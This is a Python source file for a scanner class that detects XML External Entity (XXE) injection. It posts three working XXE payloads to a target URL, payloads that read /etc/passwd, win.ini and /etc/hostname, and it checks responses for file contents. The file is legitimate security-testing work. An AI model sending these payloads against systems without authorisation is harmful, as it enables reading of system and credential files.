from typing import List
import requests
from models.schemas import VulnerabilitySchema, SeverityEnum


class XXEScanner:
    """XML External Entity (XXE) vulnerability scanner"""

    XXE_PAYLOADS = [
        '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>''',

        '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<data>&xxe;</data>''',

        '''<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe SYSTEM "file:///etc/hostname" >]>
<data>&xxe;</data>''',
    ]

    EVIDENCE_PATTERNS = [
        "root:x:",
        "[boot loader]",
        "[extensions]",
        "localhost",
        "bin/bash",
    ]

    def __init__(self, timeout: int = 10):
        self.timeout = timeout

    def scan(self, url: str, depth: int = 1) -> List[VulnerabilitySchema]:
        """Scan URL for XXE vulnerabilities"""
        vulnerabilities = []

        try:
            for payload in self.XXE_PAYLOADS:
                try:
                    headers = {
                        'Content-Type': 'application/xml',
                        'Accept': 'application/xml'
                    }

                    response = requests.post(
                        url,
                        data=payload,
                        headers=headers,
                        timeout=self.timeout,
                        allow_redirects=False
                    )

                    # Check for XXE evidence
                    if any(pattern in response.text for pattern in self.EVIDENCE_PATTERNS):
                        vulnerabilities.append(
                            VulnerabilitySchema(
                                name="XML External Entity (XXE) Injection",
                                description="XXE vulnerability allows attacker to access local files",
                                severity=SeverityEnum.CRITICAL,
                                cvss_score=9.1,
                                url=url,
                                method="POST",
                                evidence=response.text[:500],
                                payload=payload[:200] + "...",
                                remediation="Disable XML external entity processing. Use less complex data formats like JSON. Update XML parsers.",
                                references=[
                                    "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
                                    "https://cwe.mitre.org/data/definitions/611.html"
                                ],
                                cwe_id="CWE-611"
                            )
                        )
                        break

                except requests.RequestException:
                    continue

        except Exception as e:
            print(f"Error scanning for XXE: {e}")

        return vulnerabilities
